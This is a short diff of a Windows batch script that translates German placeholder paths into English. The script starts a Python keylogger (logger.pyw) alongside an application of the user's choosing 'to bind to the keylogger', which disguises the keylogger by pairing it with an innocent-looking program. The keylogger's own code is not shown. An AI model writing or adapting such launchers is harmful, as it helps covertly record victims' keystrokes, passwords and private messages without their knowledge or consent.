@@ -2,5 +2,5 @@
 
 @echo off
 
-start "" "C:\(pfad einfügen von keylogger)logger.pyw "
-start "" "C:\(pfad einfügen von gewünschter kombinations programm)"
+start "" "C:\(path of the keylogger)logger.pyw "
+start "" "C:\(path of the application you want to bind to the keylogger)"
